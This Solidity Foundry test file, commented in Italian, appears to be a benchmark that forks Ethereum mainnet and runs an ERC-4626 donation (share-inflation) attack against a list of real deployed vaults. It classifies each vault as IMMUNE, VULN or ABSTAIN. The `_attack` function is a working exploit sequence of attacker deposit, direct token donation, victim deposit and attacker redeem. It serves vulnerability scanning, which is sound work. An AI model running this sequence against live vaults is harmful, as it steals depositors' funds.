// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// BENCHMARK ESEGUIBILE su SCALA: l'exec-gate-fork contro N vault ERC-4626 reali deployati su mainnet (validati).
// Un fork, loop su tutti, stesso attacco fedele (ABI reale), verdetto 3-vie {IMMUNE|VULN|ABSTAIN+reason} + SUMMARY.
// Disciplina: IMMUNE solo se eseguibile e non-profittevole; se non eseguibile -> ABSTAIN (mai finto-verdetto).
import "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {IVault} from "../src/IVault.sol";
import {VaultList} from "./_VaultList.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

// helper esterno: `deal` e' un cheatcode che REVERTA il test se non trova lo slot del balance; wrappandolo
// in una chiamata esterna posso try/catch-arlo -> token non-finanziabile diventa ABSTAIN, non un crash.
contract Dealer is StdCheats {
    function doDeal(address token, address to, uint256 amt) external { deal(token, to, amt); }
}

contract BenchGate is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);
    Dealer dealer;

    function testBenchmark() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpc).length == 0) { emit log_string("SUMMARY skipped no-RPC"); return; }
        vm.createSelectFork(rpc);
        dealer = new Dealer();
        (string[] memory names, address[] memory addrs) = VaultList.get();
        uint256 immune; uint256 vuln; uint256 abst;
        for (uint256 i = 0; i < names.length; i++) {
            (int256 maxP, uint8 status) = _probeVault(addrs[i]);
            if (status == 0 && maxP > 0) {
                vuln++;
                emit log_string(string.concat("RESULT ", names[i], " VULN maxProfit=", vm.toString(maxP)));
            } else if (status == 0) {
                immune++;
                emit log_string(string.concat("RESULT ", names[i], " IMMUNE maxProfit=", vm.toString(maxP)));
            } else {
                abst++;
                emit log_string(string.concat("RESULT ", names[i], " ABSTAIN status=", vm.toString(uint256(status))));
            }
        }
        emit log_string(string.concat("SUMMARY total=", vm.toString(names.length),
            " IMMUNE=", vm.toString(immune), " VULN=", vm.toString(vuln), " ABSTAIN=", vm.toString(abst)));
        // disciplina F0: zero falsi-positivi -> ogni VULN dev'essere un exploit ESEGUITO (verifica manuale se >0)
        assertEq(vuln, 0, "nessun VULN atteso su vault established; se >0 -> verifica avversariale prima di dichiarare");
    }

    function _probeVault(address vaultAddr) internal returns (int256 maxP, uint8 status) {
        if (vaultAddr.code.length == 0) return (int256(0), 9);
        IVault v = IVault(vaultAddr);
        address asset;
        try v.asset() returns (address a) { asset = a; } catch { return (int256(0), 8); }
        uint8 dec;
        try IERC20Like(asset).decimals() returns (uint8 d) { dec = d; } catch { dec = 18; }
        uint256 unit = 10 ** dec;
        uint256 V = 100 * unit;
        uint256[3] memory Ds = [uint256(100 * unit), 10000 * unit, 1000000 * unit];
        maxP = type(int256).min; uint256 executed;
        for (uint256 i = 0; i < 3; i++) {
            uint256 snap = vm.snapshotState();
            (int256 p, uint8 st) = _attack(v, asset, unit, V, Ds[i]);
            vm.revertToState(snap);
            if (st == 0) { executed++; if (p > maxP) maxP = p; } else { status = st; }
        }
        if (executed > 0) status = 0;
    }

    // status: 0=eseguito,1=unfundable,2=atk-deposit-revert,3=vic-deposit-revert,4=zero-shares,5=redeem-revert
    function _attack(IVault v, address asset, uint256 unit, uint256 V, uint256 D) internal returns (int256 profit, uint8 status) {
        uint256 dust = 100 * unit;                          // dust adattivo: >=1 share su vault seeded
        try dealer.doDeal(asset, atk, dust + D) {} catch { return (int256(0), 1); }   // token non-finanziabile -> ABSTAIN
        try dealer.doDeal(asset, vic, V) {} catch { return (int256(0), 1); }
        if (IERC20Like(asset).balanceOf(atk) < dust + D) return (int256(0), 1);
        vm.startPrank(atk);
        _approve(asset, address(v));                         // low-level: tollera token non-standard (USDT)
        uint256 atkShares;
        try v.deposit(dust, atk) returns (uint256 s) { atkShares = s; } catch { vm.stopPrank(); return (int256(0), 2); }
        if (atkShares == 0) { vm.stopPrank(); return (int256(0), 4); }
        (bool okT,) = asset.call(abi.encodeWithSelector(0xa9059cbb, address(v), D));   // transfer (donazione)
        if (!okT) { vm.stopPrank(); return (int256(0), 2); }
        vm.stopPrank();
        vm.startPrank(vic);
        _approve(asset, address(v));
        try v.deposit(V, vic) returns (uint256) { vm.stopPrank(); } catch { vm.stopPrank(); return (int256(0), 3); }
        vm.startPrank(atk);
        try v.redeem(v.balanceOf(atk), atk, atk) returns (uint256 g) { profit = int256(g) - int256(dust + D); }
        catch { vm.stopPrank(); return (int256(0), 5); }
        vm.stopPrank();
        status = 0;
    }

    // approve via low-level call: ignora il valore di ritorno -> tollera USDT & co. (approve non-bool)
    function _approve(address asset, address spender) internal {
        asset.call(abi.encodeWithSelector(0x095ea7b3, spender, type(uint256).max));
    }
}
